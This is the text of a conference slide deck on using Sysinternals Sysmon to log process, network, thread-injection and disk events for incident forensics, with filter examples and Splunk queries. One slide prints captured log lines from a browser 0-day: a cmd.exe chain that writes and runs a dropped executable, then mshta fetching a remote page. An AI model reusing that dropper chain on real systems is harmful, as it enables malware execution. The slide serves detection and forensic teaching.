HTA-W05
Tracking Hackers on Your Network with Sysinternals Sysmon
#RSAC

Mark Russinovich
CTO, Microsoft Azure Microsoft Corporation @markrussinovich

#RSAC
Windows Forensic Monitoring Limitations
When attackers or malware get on your network, you need to construct a timeline
What was the entry point? Did it spread between systems? What happened on a particular system?
Built-in Windows tooling make it hard to answer these questions:
Limited information captured for process creates and DLL loading Network connection information simultaneously too limited and verbose No way to capture common attacker behavior (e.g. thread injection)
2

#RSAC
Sysinternals Sysmon (System Monitor)
Background system monitoring utility
Record system events to the Windows event log Can be used for system anomaly detection Forensics can trace intruder activity across the network
I wrote it for use within Microsoft corporate network
To understand attacker behavior and tools Significant contributions by Thomas Garnier
Free download from Sysinternals.com

#RSAC
Agenda
Sysmon Overview Architecture and Advanced Filtering System Forensics Network Analysis Tips
4

#RSAC
Sysmon Overview
5

#RSAC
Sysmon Command-Line Usage
Installation: sysmon -i -accepteula [options]
Extracts binaries into %systemroot% Registers event log manifest Enables default configuration
Viewing and updating configuration: sysmon -c [options]
Updates take effect immediately Options can be basic options or a configuration file
Register event manifest for viewing logs only: sysmon -m
Uninstall: sysmon -u
6

Sysmon Events

Category Process Create Process Terminated Driver Loaded Image Loaded File Creation Time Changed Network Connection CreateRemoteThread RawAccessRead* Sysmon Service State Change Error

*Contributed by David Magnotti

7

Event ID 1 5 6 7 2 3 8 9 4 255

#RSAC

#RSAC
Basic Configuration Options

Installing with no options logs all the following with SHA1 hashes where applicable:
Process create, Process terminate, Driver loaded, File creation time changed, RawAccessRead, CreateRemoteThread, Sysmon service state changed

Additional basic options:

Option

-h [SHA1] [MD5] [SHA256] [IMPHASH] [*]

-n [process,...]

-l [process,...]

--

8

Description Hash algorithm(s) Logs network events Logs image load events Restores default configuration (-c only)

#RSAC
Hashes and VirusTotal
You can extract a hash and paste it into VT search for a report:
9

#RSAC
Advanced Configuration
Basic options are limited:
Cannot disable events via basic options (e.g. CreateRemoteThread, RawAccessRead) Advanced filtering not possible (e.g. process name filters)
Sysmon configuration file supports all configuration options: install: sysmon -i -accepteula c:\SysmonConfig.xml update: sysmon -c c:\SysmonConfig.xml
10

#RSAC
Configuration File Schema
Schema version: current is 2.01 (RawReadAccess added) HashAlgorithms:
Applies to all events `*' for all hash types
EventFiltering:
Flexible filtering rules If event type not specified, default capture rule applies
11

#RSAC
Event Tags

Each event is specified using its tag
Onmatch can be "include" or "exclude"
Include and exclude refer to filter effect Filters described later...

<tag onmatch="include"> <include filter/> ...
</tag>

<tag onmatch="exclude"> <exclude filter/> ...
</tag>

Tags
ProcessCreate ProcessTerminate FileCreateTime NetworkConnect DriverLoad ImageLoad CreateRemoteThread RawAccessRead

12

#RSAC
Event Tags With No Filters
Useful for enabling specific event types If no filter, onmatch has opposite effect:
Include: don't log any events Exclude: log all events of the tag type
This configuration enables the following:
ProcessCreate: because of onmatch exclude ProcessTerminate: because it is omitted and by default enabled
13

#RSAC
Architecture and Advanced Filtering
14

#RSAC
Sysmon Architecture

Windows service and device driver (~1.5 MB total)
Single binary includes 32-bit and 64-bit versions of both Service doubles as command-line frontend
Configuration stored in HKLM\System\CCS\Services\SysmonDrv\Parameters

Sysmon (Cmd)

Sysmon (Service)

User Mode Kernel Mode

SysmonDrv

15

Advanced Filtering
Filters are specified as event field conditions:
Field is any field in event schema Condition types can be used with any field
<eventtag onmatch="include"> <field condition="conditiontype">value</field> ...
</eventtag>
16

#RSAC
ConditionType is Is not contains excludes begin with end with less than more than image

#RSAC
Process Events

Generated from PsSetCreateProcessNotifyRoutine PsSetCreateThreadNotifyRoutine
Image, command line, etc. captured from PEB
Hashes captured by driver
ProcessGuid, LogonGuid uniquely identify process (PID and LogonId can be reused)
17

ProcessCreate UtcTime ProcessGuid ProcessId Image CommandLine CurrentDirectory User LogonGuid LogonId TerminalSessionId IntegrityLevel

Hashes ParentProcessGuid ParentProcessId ParentImage ParentCommandLine
ProcessTerminate UtcTime ProcessGuid ProcessId Image

#RSAC
Image and Driver Loaded

Generated from PsSetLoadImageNotifyRoutine

Hash captured by driver Signature captured by service Image is process image ImageLoaded is driver/DLL image

ImageLoaded UtcTime ProcessGuid ProcessId Image ImageLoaded Hashes Signed Signatures

DriverLoaded UtcTime ImageLoaded Hashes Signed Signature

18

#RSAC
File Events

Generated by file system mini-filter
File timestamps commonly changed by attackers covering their tracks
Dropped files blend in Altered files appear unchanged
Watch for false positives:
ZIP extractors change timestamps to match source files Browsers change timestamps to match original file download
19

File Creation Time Changed UtcTime ProcessGuid ProcessId Image TargetFileName CreationUtcTime PreviousCreationUtcTime

#RSAC
Network Events

Generated by service ETW tracing
Both UDP and TCP
Includes DNS and port name resolution
Initiated indicates process initiated TCP connection
Recorded on first process+source+dest tuple observed

Network Connection Detected UtcTime ProcessGuid ProcessId Image User Protocol Initiated SourceIsIpv6 SourceIp SourceHostName SourcePort SourcePortName

20

DestinationIsIpv6 DestinationIp DestinationHostName DesinationPort DesinationPortName

#RSAC
Thread Events

Generated from PsSetCreateThreadNotifyRoutine when source process different from thread process
Start module determined from thread start address mapping to PEB loaded module list
Start function is reported if exact match to function in image export table

Common for malware injecting code into another process

To cover tracks

To easily operate in target address space

There can be false positives: debuggers, crash

dumps

21

CreateRemoteThread Detected UtcTime SourceProcessGuid SourceProcessId SourceImage TargetProcessGuid TargetProcessId TargetImage NewThreadId StartAddress StartModule StartFunction

#RSAC
Disk/Volume Read Events

Generated from file system mini-filter when volume/disk is opened directly
Common for malware bypassing standard security protections/auditing
e.g. extracting password hashes from data files

RawReadAccess Detected UtcTime ProcessGuid ProcessId Image Device

22

#RSAC
Filter Examples
Include only Google Chrome network activity:
<NetworkConnect onmatch="include"> <Image condition="contains">chrome.exe</Image>
</NetworkConnect >
Include thread injections into winlogon and lsass:
<CreateRemoteThread onmatch="include"> <TargetImage condition="image">lsass.exe</TargetImage> <TargetImage condition="image">winlogon.exe</TargetImage>
</CreateRemoteThread >
Exclude all Microsoft-signed image loads:
<ImageLoad onmatch="exclude"> <Signature condition="contains">microsoft</Signature> <Signature condition="contains">windows</Signature>
</ImageLoad>
23

#RSAC
System Forensics: The Case of the Unwanted Software, SONAR
24

#RSAC
The Case of My Mom's Chronically Infected PC
Mom's PC repeatedly infected with malware
Either MS Security Essentials or I would clean it Made her standard user She still got infected

#RSAC
The Case of My Mom's Chronically Infected PC
Saw from Defender log that malware was using the name drvinst:
Where was it coming from? Installed Sysmon to hope to trace the cause
Sure, enough, system was reinfected...
26

#RSAC
The Case of My Mom's Chronically Infected PC
Remotely connected and downloaded Sysmon log Searched for drvinst and found MSEE cleaning infection at 9/14/14 4:21 AM, but no suspicious entries nearby:

#RSAC
The Case of My Mom's Chronically Infected PC
Searched again for drvinst and came across Drvinst-2.exe launch
Launched by SwvUpdater, so searched for that...

#RSAC
The Case of My Mom's Chronically Infected PC
Saw entry that showed it was launched by scheduled task:

#RSAC
The Case of My Mom's Chronically Infected PC
Used Sigcheck to submit it to VirusTotal
Many engines flagged it as malicious Sadly, MSEE did not (subsequently submitted to MS)
How could I have missed it?

The Case of My Mom's Chronically Infected PC:

#RSAC

Solved

Opened Autoruns and found its scheduled task:

Had overlooked it in cleanings because of generic description and valid signature
Disabled it: problem solved

#RSAC
SONAR

Detonation chamber for malware, O365 attachment validation, IE 0-day detection
Sysmon logs detect malware escape from Windows, IE and Office sandboxes
Sysmon log analysis can lead researchers to escape vulnerability

Flash 0-day detected in December:

Image C:\Program Files\Internet Explorer\iexplore.exe C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
C:\Users\User\AppData\Local\Temp\Low\execb.exe C:\Windows\System32\mshta.exe

CommandLine

ParentImage

ParentImage CommandLine

C:\Program Files\Internet Explorer\iexplore.exe SCODEF:512 CREDAT:267521 /prefetch:2

C:\Program Files\Internet Explorer\iexplore.exe C:\Program Files\Internet Explorer\iexplore.exe http://[REDACTED].com/Infected.swf

cmd /c

C:\Program Files\Internet Explorer\iexplore.exe

echo|set/p="MZ">"c:\users\user\appdata\local\temp\low\execb.exe"&type

"c:\users\user\appdata\local\temp\low\S">>"c:\users\user\appdata\local\temp\l

ow\execb.exe"&"c:\users\user\appdata\local\temp\low\execb.exe"

C:\Program Files\Internet Explorer\iexplore.exe SCODEF:512 CREDAT:267521 /prefetch:2

C:\Windows\system32\cmd.exe /S /D /c" set/p="MZ" 1>"c:\users\user\appdata\local\temp\low\execb.exe""
"c:\users\user\appdata\local\temp\low\execb.exe" C:\Windows\system32\mshta.exe "http://[REDACTED].com/Page.aspx"

C:\Windows\System32\cmd.exe

cmd /c

echo|set/p="MZ">"c:\users\user\appdata\local\temp\low\

execb.exe"&type

"c:\users\user\appdata\local\temp\low\S">>"c:\users\user

\appdata\local\temp\low\execb.exe"&"c:\users\user\appd

ata\local\temp\low\execb.exe"

C:\Windows\System32\cmd.exe

C:\Windows\system32\cmd.exe /S /D /c" set/p="MZ"

1>"c:\users\user\appdata\local\temp\low\execb.exe""

c:\users\user\appdata\local\temp\low\execb.exe "c:\users\user\appdata\local\temp\low\execb.exe"

#RSAC
Network-Wide Monitoring: Splunk, Microsoft Operations Management Suite
33

#RSAC
Splunk
Splunk enables collection and rich queries of Sysmon data
Configuring Splunk for Sysmon (https://github.com/splunk/TAmicrosoft-sysmon):
Install Splunk universal forwarder on Sysmon systems Install Splunk Sysmon TA on search heads Set Sysmon configuration to exclude Splunk binaries
<Image condition="end with">splunk</Image> <Image condition="end with">msg_replay.exe</Image>

#RSAC
Splunk Example Queries
See http://blogs.splunk.com/2014/11/24/monitoring-network-traffic-withsysmon-and-splunk/
Processes grouped by logon GUID:
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 NOT User="NT AUTHORITY\\SYSTEM" | stats values(User) as User,values(CommandLine) as CommandLine,values(ProcessId) as ProcessId,values(ParentProcessId) as ParentProcessId values(ParentCommandLine) as ParentCommandLine by LogonGuid
Outbound connections by process:
sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 Protocol=tcp Initiated=true | eval src=if(isnotnull(SourceHostname), SourceHostname+":"+SourcePort, SourceIp+":"+SourcePort) | eval dest=if(isnotnull(DestinationHostname), DestinationHostname+":"+DestinationPort, DestinationIp+":"+DestinationPort) | eval src_dest=src + " => " + dest | stats values(src_dest) as Connection by ProcessGuid ProcessId User Computer Image
Command line for non-local connections:
sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" EventCode=3 Protocol=tcp Initiated=true | where DestinationIp!="127.0.0.1" AND DestinationHostname!=SourceHostname | table _time User Computer ProcessId ProcessGuid DestinationHostname DestinationPort | join type=inner [search sourcetype="xmlwineventlog:microsoft-windowssysmon/operational" EventCode=1 | table _time ProcessGuid ProcessId CommandLine]
35

#RSAC
Operations Management Suite
OMS
System monitoring and configuration for Windows and Linux systems (VMs, physical, cloud, etc.) Includes support for agent that can forward arbitrary logs to Operational Insights service
Logs can be used for:
Standing dashboard queries Visualization Ad-hoc exploration
36

#RSAC
Best Practices and Tips
37

#RSAC
Best Practices and Tips
Install it on all your systems
Proven at scale Data will be there when you need it for DFIR
Configure all event types for maximum visibility
Filter out noise, especially uninteresting image loads Test overhead on mission-critical systems Make sure event log is large enough to capture desired time window
Forward events off box
To prevent deletion by attackers For analyzing aggregate network behavior For tracing activity between systems (e.g. pass-the-hash)
38

#RSAC
Summary
Sysmon can give you deep insights into intrusions and infections
Send cases, tips and feature requests to me:
mark.russinovich@microsoft.com @markrussinovich
Sysmon and other Sysinternals tools are documented in the upcoming "Troubleshooting with the Sysinternals Tools"
39

